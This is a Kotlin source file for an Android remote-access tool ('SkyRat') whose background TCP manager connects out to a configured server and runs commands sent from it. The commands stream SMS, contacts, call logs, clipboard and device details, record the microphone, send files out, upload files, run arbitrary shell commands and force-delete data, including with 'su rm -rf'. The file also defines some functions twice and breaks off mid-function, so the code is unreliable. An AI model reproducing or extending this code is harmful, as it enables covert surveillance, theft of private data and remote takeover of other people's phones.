package com.techsky.skyrat

import android.Manifest
import android.app.ActivityManager
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import java.io.*
import java.net.*
import java.text.SimpleDateFormat
import java.util.*

class BackgroundTcpManager(private val context: Context) {

    companion object {
        private const val TAG = "BackgroundTcpManager"
        private const val MAX_RECONNECT_ATTEMPTS = 50
        private const val BASE_RECONNECT_DELAY = 5000L
        private const val MAX_FILE_SIZE = 50 * 1024 * 1024 // 50MB limit
    }

    @Volatile
    private var isReconnecting = false
    private var reconnectAttempts = 0
    private var currentSocket: Socket? = null
    private var connectionJob: Job? = null
    private lateinit var outputStream: OutputStream
    private var currentDirectory = Environment.getExternalStorageDirectory().absolutePath

    // Audio recording variables
    private var mediaRecorder: MediaRecorder? = null
    private var audioFile: File? = null
    private var isRecording = false

    fun startConnection() {
        cleanup()
        connectionJob = CoroutineScope(Dispatchers.IO).launch {
            execute(Config.IP, Config.PORT)
        }
    }

    private suspend fun execute(ip: String, port: String) {
        var socket: Socket? = null

        try {
            Log.d(TAG, "Starting background connection attempt to $ip:$port")

            if (!isNetworkAvailable()) {
                Log.d(TAG, "No network available, waiting...")
                delay(5000)
                return
            }

            var attempts = 0
            while (attempts < 5) {
                attempts++
                Log.d(TAG, "Connection attempt #$attempts to $ip:$port")

                socket = Socket()

                try {
                    socket.soTimeout = 30000
                    socket.keepAlive = true
                    socket.tcpNoDelay = true

                    socket.connect(InetSocketAddress(ip, port.toInt()), 10000)
                    Log.d(TAG, "Background socket connection successful!")
                    currentSocket = socket
                    reconnectAttempts = 0
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Connection error on attempt #$attempts: ${e.message}")
                    socket?.close()
                    delay(2000)
                    continue
                }
            }

            if (socket?.isConnected == true) {
                Log.d(TAG, "Background connection established successfully after $attempts attempts")
                handleConnection(socket)
            } else {
                Log.e(TAG, "Failed to establish background connection after $attempts attempts")
                scheduleReconnect()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Critical background connection error: ${e.message}", e)
            scheduleReconnect()
        } finally {
            cleanup()
        }
    }

    private suspend fun handleConnection(socket: Socket) {
        try {
            Log.d(TAG, "Setting up background streams")
            outputStream = DataOutputStream(socket.getOutputStream())
            val inputReader = BufferedReader(InputStreamReader(socket.getInputStream()))

            val deviceModel = Build.MODEL
            val androidVersion = Build.VERSION.RELEASE
            val welcomeMessage = "Hello there, welcome to complete shell of $deviceModel (Android $androidVersion)\n"
            Log.d(TAG, "Sending background welcome message")

            withContext(Dispatchers.IO) {
                outputStream.write(welcomeMessage.toByteArray(Charsets.UTF_8))
                outputStream.flush()
            }

            var line: String?
            while (socket.isConnected && !socket.isClosed) {
                try {
                    line = withContext(Dispatchers.IO) {
                        inputReader.readLine()
                    }

                    if (line == null) {
                        Log.d(TAG, "Background connection closed by server")
                        break
                    }

                    Log.d(TAG, "Background received command: '$line'")
                    processBackgroundCommand(line.trim(), socket)

                } catch (e: SocketTimeoutException) {
                    Log.d(TAG, "Socket timeout, checking connection...")
                    if (!isSocketAlive(socket)) {
                        Log.d(TAG, "Socket is dead, breaking connection")
                        break
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Background command error: ${e.message}")
                    break
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error in background connection handler: ${e.message}", e)
        } finally {
            Log.d(TAG, "Background connection ended, scheduling reconnection")
            scheduleReconnect()
        }
    }

    private suspend fun processBackgroundCommand(command: String, socket: Socket) {
        try {
            Log.d(TAG, "Processing command: '$command'")

            when {
                // === DEVICE INFORMATION ===
                command == "deviceInfo" -> {
                    val deviceInfo = getDeviceInfo()
                    sendResponse(deviceInfo, socket)
                }

                command == "getIP" -> {
                    val ipAddress = getDeviceIP()
                    sendResponse("Device IP: $ipAddress", socket)
                }

                command == "getMACAddress" -> {
                    val macAddress = getMACAddress()
                    sendResponse("MAC Address: $macAddress", socket)
                }

                command == "getSimDetails" -> {
                    val simDetails = getSimDetails()
                    sendResponse(simDetails, socket)
                }

                command == "sysinfo" -> {
                    val sysInfo = getSystemInfo()
                    sendResponse(sysInfo, socket)
                }

                // === DATA ACCESS ===
                command == "getClipData" -> {
                    val clipData = getClipboardData()
                    sendResponse("Clipboard: $clipData", socket)
                }

                command.startsWith("getSMS") -> {
                    val smsType = command.substringAfter("getSMS").trim()
                    val smsData = getSMSData(smsType.ifEmpty { "inbox" })
                    sendResponse(smsData, socket)
                }

                command == "getCallLogs" -> {
                    val callLogs = getCallLogsData()
                    sendResponse(callLogs, socket)
                }

                command == "getContacts" -> {
                    val contacts = getContactsData()
                    sendResponse(contacts, socket)
                }

                command == "getApps" -> {
                    val apps = getInstalledApps()
                    sendResponse(apps, socket)
                }

                // === FILE OPERATIONS ===
                command == "pwd" -> {
                    sendResponse("Current directory: $currentDirectory", socket)
                }

                command.startsWith("cd") -> {
                    val newPath = command.substringAfter("cd").trim()
                    val result = changeDirectory(newPath)
                    sendResponse(result, socket)
                }

                command.startsWith("ls") -> {
                    val path = command.substringAfter("ls").trim().ifEmpty { currentDirectory }
                    val listing = listDirectory(path)
                    sendResponse(listing, socket)
                }

                command.startsWith("download") -> {
                    val filePath = command.substringAfter("download").trim()
                    downloadFile(filePath, socket)
                }

                command.startsWith("upload ") -> {
                    val result = handleUpload(command, socket);
                    sendResponse(result, socket)

                }

                command.startsWith("delete") -> {
                    val args = command.split(" ").drop(1) // Remove "delete"

                    when {
                        args.isEmpty() -> {
                            sendResponse("Usage: delete <file_or_directory>", socket)
                        }

                        args[0] == "-f" && args.size > 1 -> {
                            // Force delete
                            val path = args.drop(1).joinToString(" ")
                            val result = forceDeletePath(path)
                            sendResponse(result, socket)
                        }

                        else -> {
                            val path = args.joinToString(" ")
                            val result = deletePathSimple(path)
                            sendResponse(result, socket)
                        }
                    }
                }

                command.startsWith("mkdir") -> {
                    val dirPath = command.substringAfter("mkdir").trim()
                    val result = createDirectory(dirPath)
                    sendResponse(result, socket)
                }

                // === SYSTEM OPERATIONS ===
                command == "ps" -> {
                    val processes = getRunningProcesses()
                    sendResponse(processes, socket)
                }

                command.startsWith("kill") -> {
                    val processName = command.substringAfter("kill").trim()
                    val result = killProcess(processName)
                    sendResponse(result, socket)
                }

                command == "netstat" -> {
                    val networkInfo = getNetworkConnections()
                    sendResponse(networkInfo, socket)
                }

                command.startsWith("ping") -> {
                    val host = command.substringAfter("ping").trim()
                    val result = pingHost(host)
                    sendResponse(result, socket)
                }

                // === MEDIA ACCESS ===
                command == "getPhotos" -> {
                    val photos = getPhotosInfo()
                    sendResponse(photos, socket)
                }

                command == "getAudio" -> {
                    val audio = getAudioInfo()
                    sendResponse(audio, socket)
                }

                command == "getVideos" -> {
                    val videos = getVideosInfo()
                    sendResponse(videos, socket)
                }

                // === AUDIO RECORDING (IMPLEMENTED DIRECTLY) ===
                command == "startAudio" -> {
                    val result = startAudioRecording()
                    sendResponse(result, socket)
                }

                command == "stopAudio" -> {
                    val result = stopAudioRecording()
                    sendResponse(result, socket)
                }

                // === DEVICE CONTROL ===
                command.startsWith("vibrate") -> {
                    val times = command.substringAfter("vibrate").trim().toIntOrNull() ?: 1
                    val result = vibrateDevice(times)
                    sendResponse(result, socket)
                }

                command.startsWith("setClip") -> {
                    val text = command.substringAfter("setClip").trim()
                    val result = setClipboardData(text)
                    sendResponse(result, socket)
                }

                // === SHELL COMMANDS ===
                command.startsWith("shell") -> {
                    val shellCmd = command.substringAfter("shell").trim()
                    if (shellCmd.isEmpty()) {
                        sendResponse("Usage: shell <command>", socket)
                    } else {
                        val result = executeShellCommand(shellCmd)
                        sendResponse(result, socket)
                    }
                }

                // === SYSTEM COMMANDS ===
                command == "help" -> {
                    sendResponse(getCompleteHelpText(), socket)
                }

                command == "clear" -> {
                    sendResponse("\n".repeat(50) + "Screen cleared", socket)
                }

                command == "exit" -> {
                    sendResponse("Background connection closing. Goodbye!", socket)
                    withContext(Dispatchers.IO) {
                        socket.close()
                    }
                    return
                }

                command.isEmpty() -> {
                    // Ignore empty commands
                }

                else -> {
                    sendResponse("Unknown Command: '$command'\nType 'help' for available commands", socket)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing background command '$command': ${e.message}", e)
            sendResponse("Error executing command: ${e.message}", socket)
        }
    }

    // === AUDIO RECORDING IMPLEMENTATION ===

    private fun startAudioRecording(): String {
        return try {
            if (isRecording) {
                return "Audio recording already in progress"
            }

            if (ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: RECORD_AUDIO required"
            }

            // Create audio file
            val outputDir = context.cacheDir
            audioFile = File.createTempFile("audio_", ".mp4", outputDir)

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(audioFile!!.absolutePath)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)

                prepare()
                start()
            }

            isRecording = true
            "Audio recording started successfully"

        } catch (e: Exception) {
            Log.e(TAG, "Error starting audio recording: ${e.message}")
            "Error starting audio recording: ${e.message}"
        }
    }
// ENHANCED DELETE FIX for BackgroundTcpManager.kt

    private fun deletePathSimple(inputPath: String): String {
        return try {
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
            }

            Log.d(TAG, "Delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            // Check if it's a protected system directory
            val protectedPaths = listOf(
                "/storage/emulated/0/Android",
                "/storage/emulated/0/Ringtones",
                "/storage/emulated/0/Notifications",
                "/storage/emulated/0/Alarms",
                "/storage/emulated/0/Audiobooks",
                "/storage/emulated/0/Podcasts"
            )

            if (protectedPaths.any { file.absolutePath.startsWith(it) }) {
                return "BLOCKED: ${file.name} is a protected system directory.\n" +
                        "Android 12+ prevents deletion of system media folders.\n" +
                        "Try deleting specific files instead of entire directories."
            }

            // Check writable locations
            val writablePaths = listOf(
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Documents",
                "/storage/emulated/0/Pictures",
                "/storage/emulated/0/Movies",
                "/storage/emulated/0/Music",
                "/storage/emulated/0/DCIM"
            )

            val isInWritableLocation = writablePaths.any { file.absolutePath.startsWith(it) }

            if (!isInWritableLocation && file.absolutePath.startsWith("/storage/emulated/0/")) {
                return "RESTRICTED: ${file.name} is in a restricted location.\n" +
                        "Android scoped storage only allows deletion from:\n" +
                        "- Download/\n- Documents/\n- Pictures/\n- Movies/\n- Music/\n- DCIM/\n" +
                        "Current path: ${file.absolutePath}"
            }

            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
            val itemType = if (file.isDirectory) "directory" else "file"
            val itemCount = if (file.isDirectory) countItems(file) else 1

            // Try multiple deletion methods
            val success = when {
                // Method 1: Try MediaStore deletion for media files
                isMediaFile(file) -> tryMediaStoreDelete(file)

                // Method 2: Standard file deletion
                file.isFile -> {
                    try {
                        file.delete()
                    } catch (e: Exception) {
                        Log.e(TAG, "Standard delete failed: ${e.message}")
                        false
                    }
                }

                // Method 3: Directory deletion (careful!)
                file.isDirectory -> {
                    try {
                        deleteRecursiveCareful(file)
                    } catch (e: Exception) {
                        Log.e(TAG, "Directory delete failed: ${e.message}")
                        false
                    }
                }

                else -> false
            }

            if (success) {
                "SUCCESS: Deleted $itemType '${file.name}'\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Items removed: $itemCount\n" +
                        "Space freed: ${formatFileSize(originalSize)}"
            } else {
                "FAILED: Could not delete ${file.absolutePath}\n" +
                        "Possible reasons:\n" +
                        "- Android scoped storage restrictions\n" +
                        "- File is system-protected\n" +
                        "- Insufficient permissions\n" +
                        "- File is currently in use\n\n" +
                        "TIP: Try 'delete force $inputPath' for aggressive deletion"
            }

        } catch (e: Exception) {
            "ERROR: Delete failed - ${e.message}"
        }
    }

    // Enhanced media file detection
    private fun isMediaFile(file: File): Boolean {
        val mediaExtensions = setOf(
            "jpg", "jpeg", "png", "gif", "bmp", "webp",
            "mp4", "avi", "mkv", "mov", "wmv", "flv",
            "mp3", "wav", "flac", "aac", "ogg", "m4a",
            "pdf", "doc", "docx", "txt"
        )
        return file.extension.lowercase() in mediaExtensions
    }

    // Careful recursive delete with permission checks
    private fun deleteRecursiveCareful(directory: File): Boolean {
        return try {
            var allDeleted = true
            var deletedCount = 0

            // Only delete files we can actually access
            directory.walkBottomUp().forEach { file ->
                try {
                    // Skip if we can't read the file
                    if (!file.canRead()) {
                        Log.w(TAG, "Cannot read file, skipping: ${file.absolutePath}")
                        return@forEach
                    }

                    // For files, check if they're deletable
                    if (file.isFile) {
                        if (file.canWrite() || file.delete()) {
                            deletedCount++
                            Log.d(TAG, "Deleted file: ${file.name}")
                        } else {
                            allDeleted = false
                            Log.w(TAG, "Cannot delete file: ${file.absolutePath}")
                        }
                    } else if (file.isDirectory) {
                        // Only delete empty directories
                        val contents = file.listFiles()
                        if (contents == null || contents.isEmpty()) {
                            if (file.delete()) {
                                deletedCount++
                                Log.d(TAG, "Deleted empty directory: ${file.name}")
                            } else {
                                allDeleted = false
                                Log.w(TAG, "Cannot delete directory: ${file.absolutePath}")
                            }
                        }
                    }
                } catch (e: Exception) {
                    allDeleted = false
                    Log.w(TAG, "Exception deleting ${file.absolutePath}: ${e.message}")
                }
            }

            Log.d(TAG, "Recursive delete completed. Deleted: $deletedCount items, All successful: $allDeleted")
            allDeleted

        } catch (e: Exception) {
            Log.e(TAG, "Recursive delete failed: ${e.message}")
            false
        }
    }

    // Enhanced MediaStore deletion
    private fun tryMediaStoreDelete(file: File): Boolean {
        return try {
            val resolver = context.contentResolver

            // Try different MediaStore URIs based on file type
            val uris = listOf(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                android.provider.MediaStore.Files.getContentUri("external")
            )

            for (uri in uris) {
                try {
                    val selection = "${android.provider.MediaStore.MediaColumns.DATA} = ?"
                    val selectionArgs = arrayOf(file.absolutePath)

                    val deleted = resolver.delete(uri, selection, selectionArgs)
                    if (deleted > 0) {
                        Log.d(TAG, "MediaStore delete successful: $deleted rows")
                        return true
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "MediaStore delete attempt failed for URI $uri: ${e.message}")
                }
            }

            false
        } catch (e: Exception) {
            Log.e(TAG, "MediaStore delete failed: ${e.message}")
            false
        }
    }

    // Add force delete option
    private fun forceDeleteEnhanced(inputPath: String): String {
        return try {
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
            }

            Log.d(TAG, "FORCE delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            var successMethods = mutableListOf<String>()
            var attempts = 0

            // Method 1: Root shell command (if available)
            attempts++
            if (tryRootDelete(file.absolutePath)) {
                successMethods.add("Root shell")
            }

            // Method 2: Multiple shell commands
            attempts++
            if (tryShellDeleteEnhanced(file.absolutePath)) {
                successMethods.add("Shell command")
            }

            // Method 3: MediaStore with different approaches
            attempts++
            if (tryMediaStoreDelete(file)) {
                successMethods.add("MediaStore")
            }

            // Method 4: File.delete() with permission change attempt
            attempts++
            if (tryPermissionDelete(file)) {
                successMethods.add("Permission change")
            }

            // Method 5: DocumentFile API (for newer Android)
            attempts++
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && tryDocumentFileDelete(file)) {
                successMethods.add("DocumentFile API")
            }

            if (successMethods.isNotEmpty()) {
                "FORCE DELETE SUCCESS!\n" +
                        "File: ${file.name}\n" +
                        "Path: ${file.absolutePath}\n" +
                        "Methods used: ${successMethods.joinToString(", ")}\n" +
                        "Attempts: $attempts"
            } else {
                "FORCE DELETE FAILED!\n" +
                        "File: ${file.absolutePath}\n" +
                        "All $attempts methods failed.\n" +
                        "This file may be:\n" +
                        "- System-critical and protected by Android\n" +
                        "- Actively in use by another process\n" +
                        "- Requiring root access\n" +
                        "- Protected by SELinux policies"
            }

        } catch (e: Exception) {
            "FORCE DELETE ERROR: ${e.message}"
        }
    }

    private fun tryRootDelete(path: String): Boolean {
        return try {
            val commands = listOf(
                "su -c 'rm -rf \"$path\"'",
                "su -c 'rm -f \"$path\"'"
            )

            for (cmd in commands) {
                val process = Runtime.getRuntime().exec(cmd)
                val exitCode = process.waitFor()
                if (exitCode == 0) {
                    Log.d(TAG, "Root delete successful with: $cmd")
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Log.w(TAG, "Root delete failed: ${e.message}")
            false
        }
    }

    private fun tryShellDeleteEnhanced(path: String): Boolean {
        return try {
            val pathVariations = listOf(
                path,
                path.replace("/storage/emulated/0/", "/sdcard/"),
                path.replace("/sdcard/", "/storage/emulated/0/"),
                path.replace("/storage/emulated/0/", "/mnt/sdcard/"),
                "/data/media/0/" + path.removePrefix("/storage/emulated/0/")
            ).distinct()

            val commands = listOf("rm -rf", "rm -f", "rmdir", "unlink")

            for (testPath in pathVariations) {
                for (cmd in commands) {
                    try {
                        val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", "$cmd \"$testPath\""))
                        val exitCode = process.waitFor()
                        if (exitCode == 0) {
                            Log.d(TAG, "Shell delete successful: $cmd $testPath")
                            return true
                        }
                    } catch (e: Exception) {
                        // Continue trying other combinations
                    }
                }
            }
            false
        } catch (e: Exception) {
            Log.w(TAG, "Enhanced shell delete failed: ${e.message}")
            false
        }
    }

    private fun tryPermissionDelete(file: File): Boolean {
        return try {
            // Try to make it writable first
            if (file.setWritable(true) && file.setReadable(true)) {
                if (file.delete()) {
                    return true
                }
            }

            // Try parent directory permissions
            val parent = file.parentFile
            if (parent != null && parent.setWritable(true)) {
                return file.delete()
            }

            false
        } catch (e: Exception) {
            Log.w(TAG, "Permission delete failed: ${e.message}")
            false
        }
    }

    private fun tryDocumentFileDelete(file: File): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // This would require DocumentFile API implementation
                // Complex implementation needed for full SAF support
                Log.d(TAG, "DocumentFile deletion not fully implemented")
            }
            false
        } catch (e: Exception) {
            Log.w(TAG, "DocumentFile delete failed: ${e.message}")
            false
        }
    }
    private fun stopAudioRecording(): String {
        return try {
            if (!isRecording || mediaRecorder == null) {
                return "No active audio recording"
            }

            mediaRecorder?.apply {
                stop()
                release()
            }
            mediaRecorder = null
            isRecording = false

            audioFile?.let { file ->
                if (file.exists() && file.length() > 0) {
                    val fileData = file.readBytes()
                    val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)

                    // Clean up the file
                    file.delete()

                    // Return audio data - in real implementation, you'd send this separately
                    "Audio recording stopped. File size: ${formatFileSize(fileData.size.toLong())}\nAUDIO_DATA:$encodedData"
                } else {
                    "Audio recording stopped but no data captured"
                }
            } ?: "Audio recording stopped but file not found"

        } catch (e: Exception) {
            Log.e(TAG, "Error stopping audio recording: ${e.message}")
            isRecording = false
            mediaRecorder?.release()
            mediaRecorder = null
            "Error stopping audio recording: ${e.message}"
        }
    }

    // === VIBRATION IMPLEMENTATION ===

    private fun vibrateDevice(times: Int): String {
        return try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as android.os.VibratorManager
                vibratorManager.defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }

            if (!vibrator.hasVibrator()) {
                return "Device does not have vibrator"
            }

            repeat(times) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(500, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(500)
                }
                Thread.sleep(800) // Pause between vibrations
            }

            "Device vibrated $times times"

        } catch (e: Exception) {
            Log.e(TAG, "Error vibrating device: ${e.message}")
            "Error vibrating device: ${e.message}"
        }
    }

    // === DEVICE IP IMPLEMENTATION ===

    private fun getDeviceIP(): String {
        return try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (!addr.isLoopbackAddress) {
                        val sAddr = addr.hostAddress ?: continue
                        val isIPv4 = sAddr.indexOf(':') < 0
                        if (isIPv4) return sAddr
                    }
                }
            }
            "Unable to get IP"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // === MAC ADDRESS IMPLEMENTATION ===

    private fun getMACAddress(): String {
        return try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (intf.name.equals("wlan0", ignoreCase = true)) {
                    val mac = intf.hardwareAddress ?: continue
                    val buf = StringBuilder()
                    for (aMac in mac) {
                        buf.append(String.format("%02X:", aMac))
                    }
                    if (buf.isNotEmpty()) {
                        buf.deleteCharAt(buf.length - 1)
                    }
                    return buf.toString()
                }
            }
            "Unable to get MAC"
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    // === FILE OPERATIONS IMPLEMENTATION ===

    private fun changeDirectory(path: String): String {
        return try {
            val newDir = if (path.startsWith("/")) {
                File(path)
            } else {
                File(currentDirectory, path)
            }

            if (newDir.exists() && newDir.isDirectory) {
                currentDirectory = newDir.absolutePath
                "Changed directory to: $currentDirectory"
            } else {
                "Directory not found: ${newDir.absolutePath}"
            }
        } catch (e: Exception) {
            "Error changing directory: ${e.message}"
        }
    }

    private fun listDirectory(path: String): String {
        return try {
            val dir = File(path)
            if (!dir.exists()) {
                return "Directory not found: $path"
            }

            if (!dir.isDirectory) {
                return "Not a directory: $path"
            }

            val files = dir.listFiles()
            if (files == null) {
                return "Permission denied or directory is empty"
            }

            val result = StringBuilder()
            result.append("=== DIRECTORY LISTING: $path ===\n\n")

            // Sort files: directories first, then files
            val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))

            for (file in sortedFiles) {
                val type = if (file.isDirectory) "DIR " else "FILE"
                val size = if (file.isFile) formatFileSize(file.length()) else "     "
                val modified = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(file.lastModified()))
                val permissions = getFilePermissions(file)

                result.append("$type $size $modified $permissions ${file.name}\n")
            }

            result.append("\nTotal: ${files.size} items")
            result.toString()

        } catch (e: Exception) {
            "Error listing directory: ${e.message}"
        }
    }

// SIMPLIFIED: Single-message download in BackgroundTcpManager.kt

    private suspend fun downloadFile(filePath: String, socket: Socket) {
        try {
            Log.d(TAG, "Download request for: $filePath")

            // Handle relative vs absolute paths
            val file = if (filePath.startsWith("/")) {
                File(filePath)
            } else {
                File(currentDirectory, filePath)
            }

            Log.d(TAG, "Resolved file path: ${file.absolutePath}")

            if (!file.exists()) {
                sendResponse("ERROR: File not found: ${file.absolutePath}", socket)
                return
            }

            if (!file.isFile) {
                sendResponse("ERROR: Not a file: ${file.absolutePath}", socket)
                return
            }

            if (file.length() > MAX_FILE_SIZE) {
                sendResponse("ERROR: File too large (max ${MAX_FILE_SIZE / 1024 / 1024}MB): ${formatFileSize(file.length())}", socket)
                return
            }

            Log.d(TAG, "Reading file: ${file.name}, size: ${file.length()}")
            val fileData = file.readBytes()
            val encodedData = Base64.encodeToString(fileData, Base64.DEFAULT)

            // SIMPLIFIED: Send everything in one message with getFile prefix
            val fileName = file.nameWithoutExtension
            val fileExtension = file.extension.ifEmpty { "bin" }
            val downloadResponse = "getFile\n$fileName|_|$fileExtension|_|$encodedData"

            withContext(Dispatchers.IO) {
                outputStream.write(downloadResponse.toByteArray(Charsets.UTF_8))
                outputStream.write("END123\n".toByteArray(Charsets.UTF_8))
                outputStream.flush()
            }

            Log.d(TAG, "Download sent successfully: ${file.name}")

        } catch (e: Exception) {
            Log.e(TAG, "Error downloading file: ${e.message}", e)
            sendResponse("ERROR: Download failed: ${e.message}", socket)
        }
    }
    // FIXED: Special response method for downloads (no END123 marker)
    private suspend fun sendDownloadResponse(message: String, socket: Socket) {
        try {
            if (!isSocketAlive(socket)) {
                Log.d(TAG, "Socket not alive, cannot send download response")
                return
            }

            withContext(Dispatchers.IO) {
                // Don't add END123 for download responses - server handles them differently
                val fullMessage = message + if (!message.endsWith("\n")) "\n" else ""
                outputStream.write(fullMessage.toByteArray(Charsets.UTF_8))
                outputStream.flush()
            }
            Log.d(TAG, "Download response sent: ${message.take(50)}...")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending download response: ${e.message}")
            Log.e(TAG, "Error sending download response: ${e.message}")
        }
    }
    private fun handleUpload(command: String, socket: Socket): String {
        return try {
            Log.d(TAG, "Processing upload: $command")

            // Parse: "upload filename base64data"
            val uploadData = command.removePrefix("upload ").trim()
            val spaceIndex = uploadData.indexOf(' ')

            if (spaceIndex == -1) return "ERROR: Usage: upload <filename> <base64data>"

            val filename = uploadData.substring(0, spaceIndex).trim()
            val base64Data = uploadData.substring(spaceIndex + 1).trim()

            if (filename.isEmpty()) return "ERROR: Filename cannot be empty"
            if (base64Data.isEmpty()) return "ERROR: No file data provided"

            val cleanData = base64Data.replace("\\s".toRegex(), "")
            val decodedBytes = Base64.decode(cleanData, Base64.DEFAULT)

            // Save to user-accessible Downloads/uploaded_files/
            val downloadDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "uploaded_files")
            if (!downloadDir.exists()) downloadDir.mkdirs()

            if (!downloadDir.canWrite()) return "ERROR: Cannot write to Downloads directory"

            // Avoid filename conflicts
            var finalFile = File(downloadDir, filename)
            var counter = 1
            while (finalFile.exists()) {
                val name = filename.substringBeforeLast('.', filename)
                val ext = if (filename.contains('.')) ".${filename.substringAfterLast('.')}" else ""
                finalFile = File(downloadDir, "${name}_$counter$ext")
                counter++
            }

            finalFile.writeBytes(decodedBytes)

            val result = "SUCCESS: Uploaded ${finalFile.name} (${formatBytes(decodedBytes.size)}) to ${finalFile.absolutePath}"
            Log.d(TAG, result)
            result

        } catch (e: IllegalArgumentException) {
            "ERROR: Invalid file data (not valid base64)"
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
            "ERROR: Upload failed - ${e.message}"
        }
    }
    private fun formatBytes(bytes: Int): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            else -> "${bytes / (1024 * 1024)} MB"
        }
    }

    private fun forceDeletePath(inputPath: String): String {
        return try {
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
            }

            Log.d(TAG, "Force delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            // Try multiple deletion strategies
            val success = when {
                // Method 1: Try shell rm first
                tryShellDelete(file.absolutePath) -> true

                // Method 2: Try with different path format
                file.absolutePath.startsWith("/storage/emulated/0/") -> {
                    val sdcardPath = file.absolutePath.replace("/storage/emulated/0/", "/sdcard/")
                    tryShellDelete(sdcardPath)
                }

                // Method 3: Standard delete
                file.delete() -> true

                // Method 4: Try MediaStore deletion for media files
                tryMediaStoreDelete(file) -> true

                else -> false
            }

            if (success) {
                "SUCCESS: Force deleted '${file.name}'\nPath: ${file.absolutePath}"
            } else {
                "FAILED: Could not force delete ${file.absolutePath}\n" +
                        "File may be system-protected or require root access"
            }

        } catch (e: Exception) {
            "ERROR: Force delete failed - ${e.message}"
        }
    }

    private fun tryShellDelete(path: String): Boolean {
        return try {
            // Try different path variations
            val paths = listOf(
                path,
                path.replace("/storage/emulated/0/", "/sdcard/"),
                path.replace("/sdcard/", "/storage/emulated/0/")
            ).distinct()

            for (testPath in paths) {
                val process = Runtime.getRuntime().exec(arrayOf("rm", "-f", testPath))
                val exitCode = process.waitFor()
                if (exitCode == 0) {
                    Log.d(TAG, "Shell delete successful for path: $testPath")
                    return true
                }
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "Shell delete failed: ${e.message}")
            false
        }
    }

    private fun tryMediaStoreDelete(file: File): Boolean {
        return try {
            // For media files, try using MediaStore
            if (file.name.matches(".*\\.(jpg|jpeg|png|gif|mp4|mp3|pdf)$".toRegex(RegexOption.IGNORE_CASE))) {
                val resolver = context.contentResolver
                val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI

                val selection = "${android.provider.MediaStore.Images.Media.DATA} = ?"
                val selectionArgs = arrayOf(file.absolutePath)

                val deleted = resolver.delete(uri, selection, selectionArgs)
                Log.d(TAG, "MediaStore delete result: $deleted rows")
                return deleted > 0
            }
            false
        } catch (e: Exception) {
            Log.e(TAG, "MediaStore delete failed: ${e.message}")
            false
        }
    }
    private fun deletePathSimple(inputPath: String): String {
        return try {
            // Handle path resolution
            val file = if (inputPath.startsWith("/")) {
                File(inputPath)
            } else {
                File(currentDirectory, inputPath)
            }

            Log.d(TAG, "Delete request for: ${file.absolutePath}")

            if (!file.exists()) {
                return "File/directory not found: ${file.absolutePath}"
            }

            val originalSize = if (file.isFile) file.length() else calculateTotalSize(file)
